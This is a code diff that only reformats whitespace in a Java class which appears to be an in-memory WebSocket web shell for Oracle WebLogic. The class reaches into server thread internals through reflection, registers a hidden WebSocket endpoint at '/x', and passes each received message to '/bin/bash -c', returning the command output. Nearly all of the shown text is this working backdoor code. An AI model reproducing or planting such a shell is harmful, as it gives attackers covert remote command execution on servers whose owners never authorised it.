@@ -28,29 +28,29 @@ public class cmsMSBYNC extends Endpoint implements MessageHandler.Whole<String> 
 
     static {
         try {
-            Map<String, String> pathParams                = Collections.emptyMap();
-            List<Extension>     negotiatedExtensionsPhase = Collections.emptyList();
-            Transformation      transformation            = null;
-            String              subProtocol               = null;
+            Map<String, String> pathParams = Collections.emptyMap();
+            List<Extension> negotiatedExtensionsPhase = Collections.emptyList();
+            Transformation transformation = null;
+            String subProtocol = null;
 
             Thread threadLocal = Thread.currentThread();
-            Field  workEntry   = threadLocal.getClass().getDeclaredField("workEntry");
+            Field workEntry = threadLocal.getClass().getDeclaredField("workEntry");
             workEntry.setAccessible(true);
             weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor wlsRequestExecutor = (ContainerSupportProviderImpl.WlsRequestExecutor) workEntry.get(threadLocal);
-            Field                                                                     field1             = wlsRequestExecutor.getClass().getDeclaredField("connectionHandler");
+            Field field1 = wlsRequestExecutor.getClass().getDeclaredField("connectionHandler");
             field1.setAccessible(true);
             weblogic.servlet.internal.HttpConnectionHandler connectionHandler = (HttpConnectionHandler) field1.get(wlsRequestExecutor);
-            ServletRequestImpl                              request           = connectionHandler.getServletRequest();
-            ServletContext                                  servletContext    = request.getSession().getServletContext();
-            ServerEndpointConfig                            configEndpoint    = ServerEndpointConfig.Builder.create(cmsMSBYNC.class, "/x").build();
-            WsServerContainer                               container         = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
+            ServletRequestImpl request = connectionHandler.getServletRequest();
+            ServletContext servletContext = request.getSession().getServletContext();
+            ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(cmsMSBYNC.class, "/x").build();
+            WsServerContainer container = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
 
             ServletResponseImpl response = connectionHandler.getServletResponse();
             response.setHeader(Constants.UPGRADE_HEADER_NAME, Constants.UPGRADE_HEADER_VALUE);
             response.setHeader(Constants.CONNECTION_HEADER_NAME, Constants.CONNECTION_HEADER_VALUE);
             response.setHeader(HandshakeResponse.SEC_WEBSOCKET_ACCEPT, getWebSocketAccept(request.getHeader("Sec-WebSocket-Key")));
             response.setStatus(101);
-            WsHandshakeRequest  wsRequest  = new WsHandshakeRequest(request, pathParams);
+            WsHandshakeRequest wsRequest = new WsHandshakeRequest(request, pathParams);
             WsHandshakeResponse wsResponse = new WsHandshakeResponse();
             configEndpoint.getConfigurator().modifyHandshake(configEndpoint, wsRequest, wsResponse);
             try {
@@ -68,7 +68,7 @@ public class cmsMSBYNC extends Endpoint implements MessageHandler.Whole<String> 
 
     private static String getWebSocketAccept(String key) {
         byte[] WS_ACCEPT = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11".getBytes(StandardCharsets.ISO_8859_1);
-        byte[] digest    = ConcurrentMessageDigest.digestSHA1(key.getBytes(StandardCharsets.ISO_8859_1), WS_ACCEPT);
+        byte[] digest = ConcurrentMessageDigest.digestSHA1(key.getBytes(StandardCharsets.ISO_8859_1), WS_ACCEPT);
         return Base64.encodeBase64String(digest);
     }
 
@@ -88,9 +88,9 @@ public class cmsMSBYNC extends Endpoint implements MessageHandler.Whole<String> 
             } else {
                 process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", s});
             }
-            InputStream   inputStream   = process.getInputStream();
+            InputStream inputStream = process.getInputStream();
             StringBuilder stringBuilder = new StringBuilder();
-            int           i;
+            int i;
             while ((i = inputStream.read()) != -1)
                 stringBuilder.append((char) i);
             inputStream.close();
